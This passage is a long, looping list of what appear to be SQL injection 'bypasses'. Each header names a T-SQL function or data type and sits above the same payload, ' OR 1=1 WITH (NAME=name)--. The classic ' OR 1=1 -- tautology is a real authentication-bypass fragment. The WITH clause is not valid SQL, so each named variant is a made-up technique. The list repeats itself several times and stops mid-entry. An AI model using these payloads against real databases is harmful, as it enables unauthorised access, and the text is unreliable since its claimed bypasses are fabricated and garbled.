 ' OR 1=1 WITH (TRY_PARSE=try_parse)--
-
--- PARSE Bypasses
 ' OR 1=1 WITH (PARSE=parse)--
-
--- FORMAT Bypasses
 ' OR 1=1 WITH (FORMAT=format)--
-
--- CONCAT Bypasses
 ' OR 1=1 WITH (CONCAT=concat)--
-
--- CONCAT_WS Bypasses
 ' OR 1=1 WITH (CONCAT_WS=concat_ws)--
-
--- STRING_AGG Bypasses
 ' OR 1=1 WITH (STRING_AGG=string_agg)--
-
--- STRING_SPLIT Bypasses
 ' OR 1=1 WITH (STRING_SPLIT=string_split)--
-
--- STRING_ESCAPE Bypasses
 ' OR 1=1 WITH (STRING_ESCAPE=string_escape)--
-
--- TRANSLATE Bypasses
 ' OR 1=1 WITH (TRANSLATE=translate)--
-
--- TRIM Bypasses
 ' OR 1=1 WITH (TRIM=trim)--
-
--- LTRIM Bypasses
 ' OR 1=1 WITH (LTRIM=ltrim)--
-
--- RTRIM Bypasses
 ' OR 1=1 WITH (RTRIM=rtrim)--
-
--- UPPER Bypasses
 ' OR 1=1 WITH (UPPER=upper)--
-
--- LOWER Bypasses
 ' OR 1=1 WITH (LOWER=lower)--
-
--- REVERSE Bypasses
 ' OR 1=1 WITH (REVERSE=reverse)--
-
--- REPLICATE Bypasses
 ' OR 1=1 WITH (REPLICATE=replicate)--
-
--- SPACE Bypasses
 ' OR 1=1 WITH (SPACE=space)--
-
--- STUFF Bypasses
 ' OR 1=1 WITH (STUFF=stuff)--
-
--- SUBSTRING Bypasses
 ' OR 1=1 WITH (SUBSTRING=substring)--
-
--- LEFT Bypasses
 ' OR 1=1 WITH (LEFT=left)--
-
--- RIGHT Bypasses
 ' OR 1=1 WITH (RIGHT=right)--
-
--- CHARINDEX Bypasses
 ' OR 1=1 WITH (CHARINDEX=charindex)--
-
--- PATINDEX Bypasses
 ' OR 1=1 WITH (PATINDEX=patindex)--
-
--- REPLACE Bypasses
 ' OR 1=1 WITH (REPLACE=replace)--
-
--- STR Bypasses
 ' OR 1=1 WITH (STR=str)--
-
--- ASCII Bypasses
 ' OR 1=1 WITH (ASCII=ascii)--
-
--- UNICODE Bypasses
 ' OR 1=1 WITH (UNICODE=unicode)--
-
--- NCHAR Bypasses
 ' OR 1=1 WITH (NCHAR=nchar)--
-
--- CHAR Bypasses
 ' OR 1=1 WITH (CHAR=char)--
-
--- SOUNDEX Bypasses
 ' OR 1=1 WITH (SOUNDEX=soundex)--
-
--- DIFFERENCE Bypasses
 ' OR 1=1 WITH (DIFFERENCE=difference)--
-
--- QUOTENAME Bypasses
 ' OR 1=1 WITH (QUOTENAME=quotename)--
-
--- PARSENAME Bypasses
 ' OR 1=1 WITH (PARSENAME=parsename)--
-
--- ISNUMERIC Bypasses
 ' OR 1=1 WITH (ISNUMERIC=isnumeric)--
-
--- ISJSON Bypasses
 ' OR 1=1 WITH (ISJSON=isjson)--
-
--- JSON_VALUE Bypasses
 ' OR 1=1 WITH (JSON_VALUE=json_value)--
-
--- JSON_QUERY Bypasses
 ' OR 1=1 WITH (JSON_QUERY=json_query)--
-
--- JSON_MODIFY Bypasses
 ' OR 1=1 WITH (JSON_MODIFY=json_modify)--
-
--- OPENJSON Bypasses
 ' OR 1=1 WITH (OPENJSON=openjson)--
-
--- FOR JSON Bypasses
 ' OR 1=1 WITH (FOR JSON=for_json)--
-
--- JSON_PATH_EXISTS Bypasses
 ' OR 1=1 WITH (JSON_PATH_EXISTS=json_path_exists)--
-
--- JSON_ARRAY Bypasses
 ' OR 1=1 WITH (JSON_ARRAY=json_array)--
-
--- JSON_OBJECT Bypasses
 ' OR 1=1 WITH (JSON_OBJECT=json_object)--
-
--- JSON_ARRAY_AGG Bypasses
 ' OR 1=1 WITH (JSON_ARRAY_AGG=json_array_agg)--
-
--- JSON_OBJECT_AGG Bypasses
 ' OR 1=1 WITH (JSON_OBJECT_AGG=json_object_agg)--
-
--- IS_XML Bypasses
 ' OR 1=1 WITH (IS_XML=is_xml)--
-
--- XML_VALUE Bypasses
 ' OR 1=1 WITH (XML_VALUE=xml_value)--
-
--- XML_QUERY Bypasses
 ' OR 1=1 WITH (XML_QUERY=xml_query)--
-
--- XML_EXIST Bypasses
 ' OR 1=1 WITH (XML_EXIST=xml_exist)--
-
--- XML_MODIFY Bypasses
 ' OR 1=1 WITH (XML_MODIFY=xml_modify)--
-
--- XML_NODES Bypasses
 ' OR 1=1 WITH (XML_NODES=xml_nodes)--
-
--- XML_OPENXML Bypasses
 ' OR 1=1 WITH (XML_OPENXML=xml_openxml)--
-
--- XML_BULKLOAD Bypasses
 ' OR 1=1 WITH (XML_BULKLOAD=xml_bulkload)--
-
--- FOR XML Bypasses
 ' OR 1=1 WITH (FOR XML=for_xml)--
-
--- XML_SCHEMA Bypasses
 ' OR 1=1 WITH (XML_SCHEMA=xml_schema)--
-
--- XML_SCHEMA_NAMESPACE Bypasses
 ' OR 1=1 WITH (XML_SCHEMA_NAMESPACE=xml_schema_namespace)--
-
--- XML_DATATYPE Bypasses
 ' OR 1=1 WITH (XML_DATATYPE=xml_datatype)--
-
--- XML_INDEX Bypasses
 ' OR 1=1 WITH (XML_INDEX=xml_index)--
-
--- XML_VIEW Bypasses
 ' OR 1=1 WITH (XML_VIEW=xml_view)--
-
--- XML_COLLECTION Bypasses
 ' OR 1=1 WITH (XML_COLLECTION=xml_collection)--
-
--- XML_TEMPLATE Bypasses
 ' OR 1=1 WITH (XML_TEMPLATE=xml_template)--
-
--- XML_LOB Bypasses
 ' OR 1=1 WITH (XML_LOB=xml_lob)--
-
--- XML_SCHEMA_COLLECTION Bypasses
 ' OR 1=1 WITH (XML_SCHEMA_COLLECTION=xml_schema_collection)--
-
--- XML_INDEX_VIEW Bypasses
 ' OR 1=1 WITH (XML_INDEX_VIEW=xml_index_view)--
-
--- XML_NAMESPACE Bypasses
 ' OR 1=1 WITH (XML_NAMESPACE=xml_namespace)--
-
--- XML_DATA_TYPE Bypasses
 ' OR 1=1 WITH (XML_DATA_TYPE=xml_data_type)--
-
--- XML_FORMAT Bypasses
 ' OR 1=1 WITH (XML_FORMAT=xml_format)--
-
--- XML_STORAGE Bypasses
 ' OR 1=1 WITH (XML_STORAGE=xml_storage)--
-
--- XML_PROCESSING Bypasses
 ' OR 1=1 WITH (XML_PROCESSING=xml_processing)--
-
--- XML_VALIDATION Bypasses
 ' OR 1=1 WITH (XML_VALIDATION=xml_validation)--
-
--- XML_SERIALIZATION Bypasses
 ' OR 1=1 WITH (XML_SERIALIZATION=xml_serialization)--
-
--- XML_COMPRESSION Bypasses
 ' OR 1=1 WITH (XML_COMPRESSION=xml_compression)--
-
--- XML_ENCRYPTION Bypasses
 ' OR 1=1 WITH (XML_ENCRYPTION=xml_encryption)--
-
--- XML_SIGNATURE Bypasses
 ' OR 1=1 WITH (XML_SIGNATURE=xml_signature)--
-
--- XML_TRANSFORM Bypasses
 ' OR 1=1 WITH (XML_TRANSFORM=xml_transform)--
-
--- XML_QUERY Bypasses
 ' OR 1=1 WITH (XML_QUERY=xml_query)--
-
--- XML_VALUE Bypasses
 ' OR 1=1 WITH (XML_VALUE=xml_value)--
-
--- XML_EXIST Bypasses
 ' OR 1=1 WITH (XML_EXIST=xml_exist)--
-
--- XML_MODIFY Bypasses
 ' OR 1=1 WITH (XML_MODIFY=xml_modify)--
-
--- XML_NODES Bypasses
 ' OR 1=1 WITH (XML_NODES=xml_nodes)--
-
--- XML_OPENXML Bypasses
 ' OR 1=1 WITH (XML_OPENXML=xml_openxml)--
-
--- XML_BULKLOAD Bypasses
 ' OR 1=1 WITH (XML_BULKLOAD=xml_bulkload)--
-
--- XML_FOR Bypasses
 ' OR 1=1 WITH (XML_FOR=xml_for)--
-
--- XML_AUTO Bypasses
 ' OR 1=1 WITH (XML_AUTO=xml_auto)--
-
--- XML_EXPLICIT Bypasses
 ' OR 1=1 WITH (XML_EXPLICIT=xml_explicit)--
-
--- XML_RAW Bypasses
 ' OR 1=1 WITH (XML_RAW=xml_raw)--
-
--- XML_PATH Bypasses
 ' OR 1=1 WITH (XML_PATH=xml_path)--
-
--- XML_ELEMENTS Bypasses
 ' OR 1=1 WITH (XML_ELEMENTS=xml_elements)--
-
--- XML_BINARY_BASE64 Bypasses
 ' OR 1=1 WITH (XML_BINARY_BASE64=xml_binary_base64)--
-
--- XML_TYPE Bypasses
 ' OR 1=1 WITH (XML_TYPE=xml_type)--
-
--- XMLSCHEMA Bypasses
 ' OR 1=1 WITH (XMLSCHEMA=xmlschema)--
-
--- XMLDATA Bypasses
 ' OR 1=1 WITH (XMLDATA=xmldata)--
-
--- XMLNAMESPACES Bypasses
 ' OR 1=1 WITH (XMLNAMESPACES=xmlnamespaces)--
-
--- XSINIL Bypasses
 ' OR 1=1 WITH (XSINIL=xsinil)--
-
--- ROOT Bypasses
 ' OR 1=1 WITH (ROOT=root)--
-
--- BINARY_BASE64 Bypasses
 ' OR 1=1 WITH (BINARY_BASE64=binary_base64)--
-
--- TRUNCATE_YEAR Bypasses
 ' OR 1=1 WITH (TRUNCATE_YEAR=truncate_year)--
-
--- FORMAT Bypasses
 ' OR 1=1 WITH (FORMAT=format)--
-
--- DATE_FORMAT Bypasses
 ' OR 1=1 WITH (DATE_FORMAT=date_format)--
-
--- TIME_FORMAT Bypasses
 ' OR 1=1 WITH (TIME_FORMAT=time_format)--
-
--- DATETIME_FORMAT Bypasses
 ' OR 1=1 WITH (DATETIME_FORMAT=datetime_format)--
-
--- TIMESTAMP_FORMAT Bypasses
 ' OR 1=1 WITH (TIMESTAMP_FORMAT=timestamp_format)--
-
--- DECIMAL Bypasses
 ' OR 1=1 WITH (DECIMAL=decimal)--
-
--- FLOAT Bypasses
 ' OR 1=1 WITH (FLOAT=float)--
-
--- REAL Bypasses
 ' OR 1=1 WITH (REAL=real)--
-
--- MONEY Bypasses
 ' OR 1=1 WITH (MONEY=money)--
-
--- SMALLMONEY Bypasses
 ' OR 1=1 WITH (SMALLMONEY=smallmoney)--
-
--- NUMERIC Bypasses
 ' OR 1=1 WITH (NUMERIC=numeric)--
-
--- SMALLINT Bypasses
 ' OR 1=1 WITH (SMALLINT=smallint)--
-
--- TINYINT Bypasses
 ' OR 1=1 WITH (TINYINT=tinyint)--
-
--- BIT Bypasses
 ' OR 1=1 WITH (BIT=bit)--
-
--- BIGINT Bypasses
 ' OR 1=1 WITH (BIGINT=bigint)--
-
--- INT Bypasses
 ' OR 1=1 WITH (INT=int)--
-
--- CHAR Bypasses
 ' OR 1=1 WITH (CHAR=char)--
-
--- VARCHAR Bypasses
 ' OR 1=1 WITH (VARCHAR=varchar)--
-
--- TEXT Bypasses
 ' OR 1=1 WITH (TEXT=text)--
-
--- NCHAR Bypasses
 ' OR 1=1 WITH (NCHAR=nchar)--
-
--- NVARCHAR Bypasses
 ' OR 1=1 WITH (NVARCHAR=nvarchar)--
-
--- NTEXT Bypasses
 ' OR 1=1 WITH (NTEXT=ntext)--
-
--- BINARY Bypasses
 ' OR 1=1 WITH (BINARY=binary)--
-
--- VARBINARY Bypasses
 ' OR 1=1 WITH (VARBINARY=varbinary)--
-
--- IMAGE Bypasses
 ' OR 1=1 WITH (IMAGE=image)--
-
--- UNIQUEIDENTIFIER Bypasses
 ' OR 1=1 WITH (UNIQUEIDENTIFIER=uniqueidentifier)--
-
--- SQL_VARIANT Bypasses
 ' OR 1=1 WITH (SQL_VARIANT=sql_variant)--
-
--- TABLE Bypasses
 ' OR 1=1 WITH (TABLE=table)--
-
--- CURSOR Bypasses
 ' OR 1=1 WITH (CURSOR=cursor)--
-
--- TIMESTAMP Bypasses
 ' OR 1=1 WITH (TIMESTAMP=timestamp)--
-
--- HIERARCHYID Bypasses
 ' OR 1=1 WITH (HIERARCHYID=hierarchyid)--
-
--- GEOMETRY Bypasses
 ' OR 1=1 WITH (GEOMETRY=geometry)--
-
--- GEOGRAPHY Bypasses
 ' OR 1=1 WITH (GEOGRAPHY=geography)--
-
--- DATETIME Bypasses
 ' OR 1=1 WITH (DATETIME=datetime)--
-
--- SMALLDATETIME Bypasses
 ' OR 1=1 WITH (SMALLDATETIME=smalldatetime)--
-
--- DATETIME2 Bypasses
 ' OR 1=1 WITH (DATETIME2=datetime2)--
-
--- DATETIMEOFFSET Bypasses
 ' OR 1=1 WITH (DATETIMEOFFSET=datetimeoffset)--
-
--- DATE Bypasses
 ' OR 1=1 WITH (DATE=date)--
-
--- TIME Bypasses
 ' OR 1=1 WITH (TIME=time)--
-
--- DATETRUNC Bypasses
 ' OR 1=1 WITH (DATETRUNC=datetrunc)--
-
--- EOMONTH Bypasses
 ' OR 1=1 WITH (EOMONTH=eomonth)--
-
--- SWITCHOFFSET Bypasses
 ' OR 1=1 WITH (SWITCHOFFSET=switchoffset)--
-
--- TODATETIMEOFFSET Bypasses
 ' OR 1=1 WITH (TODATETIMEOFFSET=todatetimeoffset)--
-
--- AT TIME ZONE Bypasses
 ' OR 1=1 WITH (AT TIME ZONE=at_time_zone)--
-
--- ISDATE Bypasses
 ' OR 1=1 WITH (ISDATE=isdate)--
-
--- DAY Bypasses
 ' OR 1=1 WITH (DAY=day)--
-
--- MONTH Bypasses
 ' OR 1=1 WITH (MONTH=month)--
-
--- YEAR Bypasses
 ' OR 1=1 WITH (YEAR=year)--
-
--- DATENAME Bypasses
 ' OR 1=1 WITH (DATENAME=datename)--
-
--- DATEPART Bypasses
 ' OR 1=1 WITH (DATEPART=datepart)--
-
--- GETDATE Bypasses
 ' OR 1=1 WITH (GETDATE=getdate)--
-
--- GETUTCDATE Bypasses
 ' OR 1=1 WITH (GETUTCDATE=getutcdate)--
-
--- SYSDATETIME Bypasses
 ' OR 1=1 WITH (SYSDATETIME=sysdatetime)--
-
--- SYSUTCDATETIME Bypasses
 ' OR 1=1 WITH (SYSUTCDATETIME=sysutcdatetime)--
-
--- SYSDATETIMEOFFSET Bypasses
 ' OR 1=1 WITH (SYSDATETIMEOFFSET=sysdatetimeoffset)--
-
--- CURRENT_TIMESTAMP Bypasses
 ' OR 1=1 WITH (CURRENT_TIMESTAMP=current_timestamp)--
-
--- CURRENT_TIMEZONE Bypasses
 ' OR 1=1 WITH (CURRENT_TIMEZONE=current_timezone)--
-
--- DATEDIFF Bypasses
 ' OR 1=1 WITH (DATEDIFF=datediff)--
-
--- DATEADD Bypasses
 ' OR 1=1 WITH (DATEADD=dateadd)--
-
--- ISNULL Bypasses
 ' OR 1=1 WITH (ISNULL=isnull)--
-
--- NULLIF Bypasses
 ' OR 1=1 WITH (NULLIF=nullif)--
-
--- COALESCE Bypasses
 ' OR 1=1 WITH (COALESCE=coalesce)--
-
--- IIF Bypasses
 ' OR 1=1 WITH (IIF=iif)--
-
--- CHOOSE Bypasses
 ' OR 1=1 WITH (CHOOSE=choose)--
-
--- TRY_CAST Bypasses
 ' OR 1=1 WITH (TRY_CAST=try_cast)--
-
--- TRY_CONVERT Bypasses
 ' OR 1=1 WITH (TRY_CONVERT=try_convert)--
-
--- TRY_PARSE Bypasses
 ' OR 1=1 WITH (TRY_PARSE=try_parse)--
-
--- PARSE Bypasses
 ' OR 1=1 WITH (PARSE=parse)--
-
--- FORMAT Bypasses
 ' OR 1=1 WITH (FORMAT=format)--
-
--- CONCAT Bypasses
 ' OR 1=1 WITH (CONCAT=concat)--
-
--- CONCAT_WS Bypasses
 ' OR 1=1 WITH (CONCAT_WS=concat_ws)--
-
--- STRING_AGG Bypasses
 ' OR 1=1 WITH (STRING_AGG=string_agg)--
-
--- STRING_SPLIT Bypasses
 ' OR 1=1 WITH (STRING_SPLIT=string_split)--
-
--- STRING_ESCAPE Bypasses
 ' OR 1=1 WITH (STRING_ESCAPE=string_escape)--
-
--- TRANSLATE Bypasses
 ' OR 1=1 WITH (TRANSLATE=translate)--
-
--- TRIM Bypasses
 ' OR 1=1 WITH (TRIM=trim)--
-
--- LTRIM Bypasses
 ' OR 1=1 WITH (LTRIM=ltrim)--
-
--- RTRIM Bypasses
 ' OR 1=1 WITH (RTRIM=rtrim)--
-
--- UPPER Bypasses
 ' OR 1=1 WITH (UPPER=upper)--
-
--- LOWER Bypasses
 ' OR 1=1 WITH (LOWER=lower)--
-
--- REVERSE Bypasses
 ' OR 1=1 WITH (REVERSE=reverse)--
-
--- REPLICATE Bypasses
 ' OR 1=1 WITH (REPLICATE=replicate)--
-
--- SPACE Bypasses
 ' OR 1=1 WITH (SPACE=space)--
-
--- STUFF Bypasses
 ' OR 1=1 WITH (STUFF=stuff)--
-
--- SUBSTRING Bypasses
 ' OR 1=1 WITH (SUBSTRING=substring)--
-
--- LEFT Bypasses
 ' OR 1=1 WITH (LEFT=left)--
-
--- RIGHT Bypasses
 ' OR 1=1 WITH (RIGHT=right)--
-
--- CHARINDEX Bypasses
 ' OR 1=1 WITH (CHARINDEX=charindex)--
-
--- PATINDEX Bypasses
 ' OR 1=1 WITH (PATINDEX=patindex)--
-
--- REPLACE Bypasses
 ' OR 1=1 WITH (REPLACE=replace)--
-
--- STR Bypasses
 ' OR 1=1 WITH (STR=str)--
-
--- ASCII Bypasses
 ' OR 1=1 WITH (ASCII=ascii)--
-
--- UNICODE Bypasses
 ' OR 1=1 WITH (UNICODE=unicode)--
-
--- NCHAR Bypasses
 ' OR 1=1 WITH (NCHAR=nchar)--
-
--- CHAR Bypasses
 ' OR 1=1 WITH (CHAR=char)--
-
--- SOUNDEX Bypasses
 ' OR 1=1 WITH (SOUNDEX=soundex)--
-
--- DIFFERENCE Bypasses
 ' OR 1=1 WITH (DIFFERENCE=difference)--
-
--- QUOTENAME Bypasses
 ' OR 1=1 WITH (QUOTENAME=quotename)--
-
--- PARSENAME Bypasses
 ' OR 1=1 WITH (PARSENAME=parsename)--
-
--- ISNUMERIC Bypasses
 ' OR 1=1 WITH (ISNUMERIC=isnumeric)--
-
--- ISJSON Bypasses
 ' OR 1=1 WITH (ISJSON=isjson)--
-
--- JSON_VALUE Bypasses
 ' OR 1=1 WITH (JSON_VALUE=json_value)--
-
--- JSON_QUERY Bypasses
 ' OR 1=1 WITH (JSON_QUERY=json_query)--
-
--- JSON_MODIFY Bypasses
 ' OR 1=1 WITH (JSON_MODIFY=json_modify)--
-
--- OPENJSON Bypasses
 ' OR 1=1 WITH (OPENJSON=openjson)--
-
--- FOR JSON Bypasses
 ' OR 1=1 WITH (FOR JSON=for_json)--
-
--- JSON_PATH_EXISTS Bypasses
 ' OR 1=1 WITH (JSON_PATH_EXISTS=json_path_exists)--
-
--- JSON_ARRAY Bypasses
 ' OR 1=1 WITH (JSON_ARRAY=json_array)--
-
--- JSON_OBJECT Bypasses
 ' OR 1=1 WITH (JSON_OBJECT=json_object)--
-
--- JSON_ARRAY_AGG Bypasses
 ' OR 1=1 WITH (JSON_ARRAY_AGG=json_array_agg)--
-
--- JSON_OBJECT_AGG Bypasses
 ' OR 1=1 WITH (JSON_OBJECT_AGG=json_object_agg)--
-
--- IS_XML Bypasses
 ' OR 1=1 WITH (IS_XML=is_xml)--
-
--- XML_VALUE Bypasses
 ' OR 1=1 WITH (XML_VALUE=xml_value)--
-
--- XML_QUERY Bypasses
 ' OR 1=1 WITH (XML_QUERY=xml_query)--
-
--- XML_EXIST Bypasses
 ' OR 1=1 WITH (XML_EXIST=xml_exist)--
-
--- XML_MODIFY Bypasses
 ' OR 1=1 WITH (XML_MODIFY=xml_modify)--
-
--- XML_NODES Bypasses
 ' OR 1=1 WITH (XML_NODES=xml_nodes)--
-
--- XML_OPENXML Bypasses
 ' OR 1=1 WITH (XML_OPENXML=xml_openxml)--
-
--- XML_BULKLOAD Bypasses
 ' OR 1=1 WITH (XML_BULKLOAD=xml_bulkload)--
-
--- FOR XML Bypasses
 ' OR 1=1 WITH (FOR XML=for_xml)--
-
--- XML_SCHEMA Bypasses
 ' OR 1=1 WITH (XML_SCHEMA=xml_schema)--
-
--- XML_SCHEMA_NAMESPACE Bypasses
 ' OR 1=1 WITH (XML_SCHEMA_NAMESPACE=xml_schema_namespace)--
-
--- XML_DATATYPE Bypasses
 ' OR 1=1 WITH (XML_DATATYPE=xml_datatype)--
-
--- XML_INDEX Bypasses
 ' OR 1=1 WITH (XML_INDEX=xml_index)--
-
--- XML_VIEW Bypasses
 ' OR 1=1 WITH (XML_VIEW=xml_view)--
-
--- XML_COLLECTION Bypasses
 ' OR 1=1 WITH (XML_COLLECTION=xml_collection)--
-
--- XML_TEMPLATE Bypasses
 ' OR 1=1 WITH (XML_TEMPLATE=xml_template)--
-
--- XML_LOB Bypasses
 ' OR 1=1 WITH (XML_LOB=xml_lob)--
-
--- XML_SCHEMA_COLLECTION Bypasses
 ' OR 1=1 WITH (XML_SCHEMA_COLLECTION=xml_schema_collection)--
-
--- XML_INDEX_VIEW Bypasses
 ' OR 1=1 WITH (XML_INDEX_VIEW=xml_index_view)--
-
--- XML_NAMESPACE Bypasses
 ' OR 1=1 WITH (XML_NAMESPACE=xml_namespace)--
-
--- XML_DATA_TYPE Bypasses
 ' OR 1=1 WITH (XML_DATA_TYPE=xml_data_type)--
-
--- XML_FORMAT Bypasses
 ' OR 1=1 WITH (XML_FORMAT=xml_format)--
-
--- XML_STORAGE Bypasses
 ' OR 1=1 WITH (XML_STORAGE=xml_storage)--
-
--- XML_PROCESSING Bypasses
 ' OR 1=1 WITH (XML_PROCESSING=xml_processing)--
-
--- XML_VALIDATION Bypasses
 ' OR 1=1 WITH (XML_VALIDATION=xml_validation)--
-
--- XML_SERIALIZATION Bypasses
 ' OR 1=1 WITH (XML_SERIALIZATION=xml_serialization)--
-
--- XML_COMPRESSION Bypasses
 ' OR 1=1 WITH (XML_COMPRESSION=xml_compression)--
-
--- XML_ENCRYPTION Bypasses
 ' OR 1=1 WITH (XML_ENCRYPTION=xml_encryption)--
-
--- XML_SIGNATURE Bypasses
 ' OR 1=1 WITH (XML_SIGNATURE=xml_signature)--
-
--- XML_TRANSFORM Bypasses
 ' OR 1=1 WITH (XML_TRANSFORM=xml_transform)--
-
--- XML_QUERY Bypasses
 ' OR 1=1 WITH (XML_QUERY=xml_query)--
-
--- XML_VALUE Bypasses
 ' OR 1=1 WITH (XML_VALUE=xml_value)--
-
--- XML_EXIST Bypasses
 ' OR 1=1 WITH (XML_EXIST=xml_exist)--
-
--- XML_MODIFY Bypasses
 ' OR 1=1 WITH (XML_MODIFY=xml_modify)--
-
--- XML_NODES Bypasses
 ' OR 1=1 WITH (XML_NODES=xml_nodes)--
-
--- XML_OPENXML Bypasses
 ' OR 1=1 WITH (XML_OPENXML=xml_openxml)--
-
--- XML_BULKLOAD Bypasses
 ' OR 1=1 WITH (XML_BULKLOAD=xml_bulkload)--
-
--- XML_FOR Bypasses
 ' OR 1=1 WITH (XML_FOR=xml_for)--
-
--- XML_AUTO Bypasses
 ' OR 1=1 WITH (XML_AUTO=xml_auto)--
-
--- XML_EXPLICIT Bypasses
 ' OR 1=1 WITH (XML_EXPLICIT=xml_explicit)--
-
--- XML_RAW Bypasses
 ' OR 1=1 WITH (XML_RAW=xml_raw)--
-
--- XML_PATH Bypasses
 ' OR 1=1 WITH (XML_PATH=xml_path)--
-
--- XML_ELEMENTS Bypasses
 ' OR 1=1 WITH (XML_ELEMENTS=xml_elements)--
-
--- XML_BINARY_BASE64 Bypasses
 ' OR 1=1 WITH (XML_BINARY_BASE64=xml_binary_base64)--
-
--- XML_TYPE Bypasses
 ' OR 1=1 WITH (XML_TYPE=xml_type)--
-
--- XMLSCHEMA Bypasses
 ' OR 1=1 WITH (XMLSCHEMA=xmlschema)--
-
--- XMLDATA Bypasses
 ' OR 1=1 WITH (XMLDATA=xmldata)--
-
--- XMLNAMESPACES Bypasses
 ' OR 1=1 WITH (XMLNAMESPACES=xmlnamespaces)--
-
--- XSINIL Bypasses
 ' OR 1=1 WITH (XSINIL=xsinil)--
-
--- ROOT Bypasses
 ' OR 1=1 WITH (ROOT=root)--
-
--- BINARY_BASE64 Bypasses
 ' OR 1=1 WITH (BINARY_BASE64=binary_base64)--
-
--- TRUNCATE_YEAR Bypasses
 ' OR 1=1 WITH (TRUNCATE_YEAR=truncate_year)--
-
--- FORMAT Bypasses
 ' OR 1=1 WITH (FORMAT=format)--
-
--- DATE_FORMAT Bypasses
 ' OR 1=1 WITH (DATE_FORMAT=date_format)--
-
--- TIME_FORMAT Bypasses
 ' OR 1=1 WITH (TIME_FORMAT=time_format)--
-
--- DATETIME_FORMAT Bypasses
 ' OR 1=1 WITH (DATETIME_FORMAT=datetime_format)--
-
--- TIMESTAMP_FORMAT Bypasses
 ' OR 1=1 WITH (TIMESTAMP_FORMAT=timestamp_format)--
-
--- DECIMAL Bypasses
 ' OR 1=1 WITH (DECIMAL=decimal)--
-
--- FLOAT Bypasses
 ' OR 1=1 WITH (FLOAT=float)--
-
--- REAL Bypasses
 ' OR 1=1 WITH (REAL=real)--
-
--- MONEY Bypasses
 ' OR 1=1 WITH (MONEY=money)--
-
--- SMALLMONEY Bypasses
 ' OR 1=1 WITH (SMALLMONEY=smallmoney)--
-
--- NUMERIC Bypasses
 ' OR 1=1 WITH (NUMERIC=numeric)--
-
--- SMALLINT Bypasses
 ' OR 1=1 WITH (SMALLINT=smallint)--
-
--- TINYINT Bypasses
 ' OR 1=1 WITH (TINYINT=tinyint)--
-
--- BIT Bypasses
 ' OR 1=1 WITH (BIT=bit)--
-
--- BIGINT Bypasses
 ' OR 1=1 WITH (BIGINT=bigint)--
-
--- INT Bypasses
 ' OR 1=1 WITH (INT=int)--
-
--- CHAR Bypasses
 ' OR 1=1 WITH (CHAR=char)--
-
--- VARCHAR Bypasses
 ' OR 1=1 WITH (VARCHAR=varchar)--
-
--- TEXT Bypasses
 ' OR 1=1 WITH (TEXT=text)--
-
--- NCHAR Bypasses
 ' OR 1=1 WITH (NCHAR=nchar)--
-
--- NVARCHAR Bypasses
 ' OR 1=1 WITH (NVARCHAR=nvarchar)--
-
--- NTEXT Bypasses
 ' OR 1=1 WITH (NTEXT=ntext)--
-
--- BINARY Bypasses
 ' OR 1=1 WITH (BINARY=binary)--
-
--- VARBINARY Bypasses
 ' OR 1=1 WITH (VARBINARY=varbinary)--
-
--- IMAGE Bypasses
 ' OR 1=1 WITH (IMAGE=image)--
-
--- UNIQUEIDENTIFIER Bypasses
 ' OR 1=1 WITH (UNIQUEIDENTIFIER=uniqueidentifier)--
-
--- SQL_VARIANT Bypasses
 ' OR 1=1 WITH (SQL_VARIANT=sql_variant)--
-
--- TABLE Bypasses
 ' OR 1=1 WITH (TABLE=table)--
-
--- CURSOR Bypasses
 ' OR 1=1 WITH (CURSOR=cursor)--
-
--- TIMESTAMP Bypasses
 ' OR 1=1 WITH (TIMESTAMP=timestamp)--
-
--- HIERARCHYID Bypasses
 ' OR 1=1 WITH (HIERARCHYID=hierarchyid)--
-
--- GEOMETRY Bypasses
 ' OR 1=1 WITH (GEOMETRY=geometry)--
-
--- GEOGRAPHY Bypasses
 ' OR 1=1 WITH (GEOGRAPHY=geography)--
-
--- DATETIME Bypasses
 ' OR 1=1 WITH (DATETIME=datetime)--
-
--- SMALLDATETIME Bypasses
 ' OR 1=1 WITH (SMALLDATETIME=smalldatetime)--
-
--- DATETIME2 Bypasses
 ' OR 1=1 WITH (DATETIME2=datetime2)--
-
--- DATETIMEOFFSET Bypasses
 ' OR 1=1 WITH (DATETIMEOFFSET=datetimeoffset)--
-
--- DATE Bypasses
 ' OR 1=1 WITH (DATE=date)--
-
--- TIME Bypasses
 ' OR 1=1 WITH (TIME=time)--
-
--- DATETRUNC Bypasses
 ' OR 1=1 WITH (DATETRUNC=datetrunc)--
-
--- EOMONTH Bypasses
 ' OR 1=1 WITH (EOMONTH=eomonth)--
-
--- SWITCHOFFSET Bypasses
 ' OR 1=1 WITH (SWITCHOFFSET=switchoffset)--
-
--- TODATETIMEOFFSET Bypasses
 ' OR 1=1 WITH (TODATETIMEOFFSET=todatetimeoffset)--
-
--- AT TIME ZONE Bypasses
 ' OR 1=1 WITH (AT TIME ZONE=at_time_zone)--
-
--- ISDATE Bypasses
 ' OR 1=1 WITH (ISDATE=isdate)--
-
--- DAY Bypasses
 ' OR 1=1 WITH (DAY=day)--
-
--- MONTH Bypasses
 ' OR 1=1 WITH (MONTH=month)--
-
--- YEAR Bypasses
 ' OR 1=1 WITH (YEAR=year)--
-
--- DATENAME Bypasses
 ' OR 1=1 WITH (DATENAME=datename)--
-
--- DATEPART Bypasses
 ' OR 1=1 WITH (DATEPART=datepart)--
-
--- GETDATE Bypasses
 ' OR 1=1 WITH (GETDATE=getdate)--
-
--- GETUTCDATE Bypasses
 ' OR 1=1 WITH (GETUTCDATE=getutcdate)--
-
--- SYSDATETIME Bypasses
 ' OR 1=1 WITH (SYSDATETIME=sysdatetime)--
-
--- SYSUTCDATETIME Bypasses
 ' OR 1=1 WITH (SYSUTCDATETIME=sysutcdatetime)--
-
--- SYSDATETIMEOFFSET Bypasses
 ' OR 1=1 WITH (SYSDATETIMEOFFSET=sysdatetimeoffset)--
-
--- CURRENT_TIMESTAMP Bypasses
 ' OR 1=1 WITH (CURRENT_TIMESTAMP=current_timestamp)--
-
--- CURRENT_TIMEZONE Bypasses
 ' OR 1=1 WITH (CURRENT_TIMEZONE=current_timezone)--
-
--- DATEDIFF Bypasses
 ' OR 1=1 WITH (DATEDIFF=datediff)--
-
--- DATEADD Bypasses
 ' OR 1=1 WITH (DATEADD=dateadd)--
-
--- ISNULL Bypasses
 ' OR 1=1 WITH (ISNULL=isnull)--
-
--- NULLIF Bypasses
 ' OR 1=1 WITH (NULLIF=nullif)--
-
--- COALESCE Bypasses
 ' OR 1=1 WITH (COALESCE=coalesce)--
-
--- IIF Bypasses
 ' OR 1=1 WITH (IIF=iif)--
-
--- CHOOSE Bypasses
